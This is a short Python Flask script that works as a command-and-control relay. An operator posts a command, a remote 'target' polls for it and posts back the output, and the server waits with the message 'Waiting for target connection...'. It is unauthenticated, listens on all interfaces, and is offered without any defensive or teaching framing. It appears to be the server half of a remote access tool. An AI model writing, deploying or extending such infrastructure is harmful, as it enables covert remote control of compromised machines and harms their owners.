from flask import Flask, jsonify, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."

@app.route('/api/command', methods=['GET', 'POST'])
def handle_command():
    global current_command
    if request.method == 'POST':
        data = request.get_json()
        current_command = data.get('command', '')
        return jsonify({"status": "success", "command": current_command})
    cmd = current_command
    current_command = "" # Clear after reading
    return jsonify({"command": cmd})

@app.route('/api/response', methods=['GET', 'POST'])
def handle_response():
    global latest_response
    if request.method == 'POST':
        data = request.get_json()
        latest_response = data.get('response', '')
        return jsonify({"status": "success"})
    return jsonify({"response": latest_response})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
